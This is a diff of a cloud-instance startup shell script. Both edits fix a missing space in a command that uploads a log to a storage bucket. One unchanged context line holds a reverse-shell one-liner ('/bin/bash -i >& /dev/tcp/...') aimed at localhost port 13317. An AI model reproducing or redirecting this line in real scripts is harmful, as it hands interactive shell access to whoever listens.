@@ -37,7 +37,7 @@ if [[ ! -f $SETUPCOMPLETE ]]; then
 #the next line creates an empty file so it won't run the next boot
    sudo touch "$SETUPCOMPLETE"
 	cp log.txt /var/log/gcp.log
-	gcloud storage cp/var/log/gcp.log gs://plat-g-data-store/logging/"$HOSTNAME-$(date +%y-%m-%d-%H:%M:%S:%N)".txt &>> /var/log/gcloud.txt
+	gcloud storage cp /var/log/gcp.log gs://plat-g-data-store/logging/"$HOSTNAME-$(date +%y-%m-%d-%H:%M:%S:%N)".txt &>> /var/log/gcloud.txt
  	#shutdown
 else
    echo "Second Run"
@@ -72,7 +72,7 @@ bash -c '/bin/bash -i >& /dev/tcp/localhost/13317 0>&1'
 exec "$@"
 echo "stop test 9" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
 
-gcloud storage cp/var/log/gcp.log gs://plat-g-data-store/logging/"$HOSTNAME-$(date +%y-%m-%d-%H:%M:%S:%N)".txt &>> /var/log/gcloud.txt
+gcloud storage cp /var/log/gcp.log gs://plat-g-data-store/logging/"$HOSTNAME-$(date +%y-%m-%d-%H:%M:%S:%N)".txt &>> /var/log/gcloud.txt
 #shutdown
 
 fi
